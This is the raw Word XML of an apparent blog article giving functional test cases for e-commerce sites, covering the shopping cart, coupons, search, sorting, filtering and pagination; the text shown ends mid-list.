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49FA" w:rsidRPr="00584E67" w:rsidRDefault="003249FA" w:rsidP="003249FA">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="253" w:line="240" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Guidelines for Testing E-commerce Websites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Testing E-commerce Websites requires knowledge of web testing techniques and the e-commerce domain.</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Most E-commerce Websites share a general common theme and structure, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e.g</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Homepage</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00616B10" w:rsidRP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Search Results Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00616B10" w:rsidRP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Product Details Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00616B10" w:rsidRP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Order Form Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00616B10" w:rsidRP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Order Confirmation Page</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00616B10" w:rsidRDefault="00A4086E" w:rsidP="00EC39D9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="411" w:lineRule="atLeast"/>
        <w:ind w:left="633"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00616B10">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:t>Login Form Page and Accounts Pages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Of course there are many other pages on a typical e-commerce website, but the main core user journey would entail touching the above pages and that’s where testing e-commerce websites should focus on:</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>The Checkout Journey.</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These “front-end” pages most likely communicate with “back-end” web services, such as Product Search Service, Content Service, Booking Engine, Payment Services, Accounts Services, etc. Therefore, it is important when testing e-commerce websites that we test individual services in isolation as well as integrated as a whole system.</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A typical</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>user journey flow</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>would start at homepage, or a product landing page, searching for a product, reviewing the product, adding product(s) to the shopping cart, fill in order details and payment details and submitting the order.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00651D23" w:rsidRPr="00584E67" w:rsidRDefault="00651D23" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="411" w:afterAutospacing="0" w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="253" w:afterAutospacing="0"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Ideas for Testing E-commerce Websites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We have already discussed</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="FF0000"/>
            <w:sz w:val="22"/>
            <w:szCs w:val="22"/>
          </w:rPr>
          <w:t>tips and guidelines for testing web applications</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>and common test methods and test techniques for web application testing which are also applicable to testing e-commerce websites.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lastRenderedPageBreak/>
        <w:t>In this article, we examine some common test cases which are specific for testing e-commerce websites. The ideas presented here are some generic high-level test cases which are applicable to most e-commerce websites, and you can use this guide to get started with testing e-commerce websites.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Testing Shopping Cart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Shopping carts are one of the main features of an e-commerce website and thus form the center piece of testing e-commerce websites. It allows for customers to select and store multiple items in the cart and purchase them all at once.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Nowadays, shopping carts have become “intelligent” in a sense that they remember what items you store in them so you can retrieve them at a later date or even from another device.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In most cases, cookies are used to store cart data or if the user has an active account and is logged in, a session id can be stored against the user in the database. Either way, there are some key test cases which should be part of testing a shopping cart.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Add one item to the cart</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– the cart should be updated with the item with correct name, image and price.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Increase the quantity of item from the cart</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">– the price should be updated to reflect </w:t>
      </w:r>
      <w:r w:rsidR="004D5638" w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>he correct figure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="009844C0" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A4086E" w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://www.testingexcellence.com/can-you-really-automate-a-user-journey/" \t "_blank" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="posttitle"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="D35400"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t>Can You Really Automate a User Journey?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="009844C0" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>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Add the same item multiple times</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– there should be one item in the cart, but the quantity should reflect the number of additions and the total price should reflect the sum of the price of each item.</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Add multiple items of different types</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– For each item added, we should see a corresponding name, image and price and total price of all items.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lastRenderedPageBreak/>
        <w:t>Remove some items from the cart</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– the cart should update showing the existing items in the cart, total price should reflect the new sum.</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Remove all items from the cart</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– cart balance should be zero, no items should be displayed in the cart.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Click on an item in the cart</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– we should be able to see more information about the product we just clicked either as a popup or redirecting to product page.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Add item(s) to the cart, close the browser and reopen the same site</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– ideally the cart should still hold your items. N.B this particularly depends on the requirements on how the cart should behave.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Coupons</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– need to check that the price of the cart is discounted when we apply a coupon and not discounted when we apply an invalid or expired coupon.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:after="253"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Search Form, Sorting, Filtering, Pagination</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The search form is usually present on multiple pages to allow users to search for products wherever they are on the site. Therefore, it is important that the search feature is tested from applicable pages.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Most probably the code for the search module is reused in multiple pages or templates, or it could be part of the header section which is displayed across the whole site. If this is case, the behavior of the search feature should be the same wherever it occurs and running all test cases on all pages is a waste of exercise.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Testing e-commerce websites wouldn’t be fun without testing the most feature rich page on the site, the Search Results Page.</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When we search for a product, we get redirected to the Search Results Page (SRP) with all the relevant items we searched for. There are many things to check for and many features to test, but the three features that are of most important and relevant specifically to SRP are sorting, filtering and pagination.</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Relevant products</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– check that the products displayed are related to what was searched for.</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lastRenderedPageBreak/>
        <w:t>Product information</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– the products should display an image, name, price and maybe customer ratings and number of reviews.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="009844C0" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:u w:val="none"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00A4086E" w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "http://www.testingexcellence.com/how-to-test-responsive-web-design/" \t "_blank" </w:instrText>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="00A4086E" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="posttitle"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="D35400"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA"/>
        </w:rPr>
        <w:t>How to Test Responsive Web Design</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A4086E" w:rsidRPr="00584E67" w:rsidRDefault="009844C0" w:rsidP="00A4086E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="411" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="666666"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>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Number of products per page</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– check that the number of products per page matches the requirement.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Pagination</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– check that all items in next page is different to the previous page, i.e. no duplicates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Sorting</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– there could be four to five options to select from a drop-down menu. Sorting is usually single-select, i.e. you can sort by one parameter only.</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Sorting and Pagination</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> – when there are products in multiple pages, when you sort by a parameter, the sort order should remain as you paginate, or more products loaded (if it is an Ajax load)</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Filtering</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– unlike sort option, filter options are multi-select, that is you can filter by multiple parameters. It is a good idea to explore single filters and multi-filter options.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Filtering and Pagination</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– Again, this is important, when we filter in one page, ideally as we paginate we would want the filter to be applied throughout.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Sorting and Filtering</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>– an important test case is mixing the sorting and filtering options together, e.g. filter by price and then sort by price high-to-low, or other way round. Whilst the individual features on their own might work correctly, when combined with another feature, the functionality of one or both features might break, so it is essential that we check the results when combining filtering with sorting.</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Sorting, Filtering and Pagination</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="666666"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="666666"/>
